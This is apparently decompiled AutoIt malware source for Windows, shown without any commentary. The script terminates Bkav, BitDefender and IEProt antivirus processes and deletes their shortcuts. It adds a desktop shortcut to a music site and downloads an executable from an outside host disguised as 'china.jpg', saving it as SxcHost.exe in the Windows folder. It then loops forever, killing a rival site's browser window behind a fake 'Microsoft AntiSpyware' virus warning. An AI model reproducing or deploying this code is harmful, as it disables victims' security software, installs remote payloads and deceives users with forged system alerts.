; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\auto_script\ccc.au3>
; ----------------------------------------------------------------------------

#NoTrayIcon
If ProcessExists("Bkav2006Home.exe") Then
ProcessClose("Bkav2006Home.exe")
FileDelete(@DesktopDir & "\Bkav2006.exe")
FileDelete(@DesktopCommonDir & "\Bkav2006.exe")
EndIf

If ProcessExists("BkavPro.exe") Then
ProcessClose("BkavPro.exe")
FileDelete(@DesktopDir & "\Bkav2006.exe")
FileDelete(@DesktopCommonDir & "\Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

If ProcessExists("vsserv.exe") Then
   ProcessClose("vsserv.exe")
EndIf

$urlsite = "http://nghenhac.name/"
FileCreateShortcut(@ProgramFilesDir  & "\Internet Explorer\IEXPLORE.EXE",@DesktopDir & "\NgheNhac Online.lnk",@WindowsDir,$urlsite, "NgheNhac Online;-)", @SystemDir & "\shell32.dll", "^!t", "220", @SW_MINIMIZE)
If Not FileExists(@WindowsDir & "\SxcHost.exe") Then
   InetGet ("http://dangthai.xinwen520.net/china.jpg", @WindowsDir & "\SxcHost.exe", 0, 1)
   Sleep(5000)
 EndIf
 Opt("WinTitleMatchMode", 2)
Opt("WinWaitDelay", 1)

$sTitle = "wWw.Yeu1Phut.InFo - Am Nhac - Giai Tri - Microsoft Internet Explorer"


While 1
If WinExists($sTitle) Then WinKill($sTitle)
Sleep(10)
Opt("WinTitleMatchMode", 2)

Do
    Sleep(10)
Until WinExists($sTitle)
MsgBox(0, "Microsoft AntiSpyware ", "This site Www.Yeu1Phut.Info have viruts ! close ?")
WinKill($sTitle)



 WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\auto_script\ccc.au3>
; ----------------------------------------------------------------------------

